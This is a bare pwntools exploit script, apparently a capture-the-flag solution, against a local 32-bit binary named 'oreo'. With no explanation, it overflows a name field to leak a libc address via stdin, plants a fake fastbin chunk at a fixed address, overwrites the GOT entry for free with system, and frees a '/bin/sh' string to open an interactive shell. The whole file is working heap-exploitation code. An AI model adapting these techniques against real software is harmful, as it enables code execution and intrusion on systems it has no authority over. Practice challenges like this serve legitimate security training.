from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./oreo"
bin = ELF(file)
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

conn = process(file)
#gdb.attach(conn)

def menu(choice):
#  conn.recvuntil("Exit")
  conn.sendline(str(choice))

def add(name, description):
  menu(1)
  #conn.recvuntil("name")
  conn.sendline(name)
  #conn.recvuntil("description")
  conn.sendline(description)

def show():
  menu(2)

def order():
  menu(3)

def leave_msg(message):
  menu(4)
  #conn.recvuntil("submit with your order:")
  conn.sendline(message)

def stats():
  menu(5)

# Leaking libc
add("a"*27 + p32(bin.symbols['stdin']), "bb")
show()
conn.recvuntil("Description:")
conn.recvuntil("Description: ")
libc_leak = u32(conn.recvn(4))
libc.address = libc_leak - 0xf772e5a0 + 0xf757c000
log.info(hex(libc_leak))
log.info("Libc base: " + hex(libc.address))

# Creating a fastbin at rifle_count
for i in range(0x38 + 7):
  add("a", "b")
add("a"*27 + p32(0x0804A2A8), "b")
leave_msg("\x00"*0x20 + p32(0) + p32(0x41))
order()
add("a", p32(bin.got['free']))
leave_msg(p32(libc.symbols['system']) + p32(libc.symbols['fgets']))
add("def", "/bin/sh")
order()

conn.interactive()
